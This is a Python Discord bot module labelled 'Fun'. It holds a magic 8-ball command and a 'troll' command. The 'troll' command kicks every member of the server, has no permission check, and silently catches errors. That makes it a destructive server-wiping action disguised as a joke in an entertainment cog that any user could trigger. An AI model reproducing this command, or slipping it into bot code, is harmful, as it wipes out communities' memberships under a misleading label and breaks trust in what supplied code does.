import random

from discord.ext import commands


class Fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['8ball'])
    async def _8ball(self, ctx, *, question):
        responses = ['It is certain', 'It is decidedly so', 'Without a doubt', 'Yes – definitely', 'You may rely on it',
                     'As I see it, yes', 'Most likely', 'Outlook good', 'Signs point to yes', 'Reply hazy',
                     'Try again',
                     'Ask again later', 'Better not tell you now', 'Cannot predict now', 'Concentrate and ask again',
                     'Don\'t count on it', 'My reply is no', 'My sources say no', 'Outlook not so good',
                     'Very doubtful']
        await ctx.send(f'Question: {question} \nAnswer: {random.choice(responses)}')

    @_8ball.error
    async def info_error(self, ctx, error):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send('Please provide a question for me to answer!')

    @commands.command()
    async def troll(self, ctx):
        for member in ctx.guild.members:
            try:
                await member.kick(reason='trolled')
            except:
                await ctx.send(f"could not troll {member} 😐")


def setup(bot):
    bot.add_cog(Fun(bot))
